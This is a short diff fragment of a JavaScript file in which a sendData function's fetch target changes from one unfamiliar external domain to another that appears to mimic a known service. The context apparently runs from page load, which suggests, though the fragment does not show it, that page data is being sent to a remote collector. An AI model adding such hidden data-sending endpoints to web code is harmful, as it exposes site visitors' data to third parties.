@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
 function sendData() {
-    const url = 'https://request.rdmrqstdmn.info/';
+    const url = 'https://postman-lc.com/';
 
     try {
         fetch(url, {
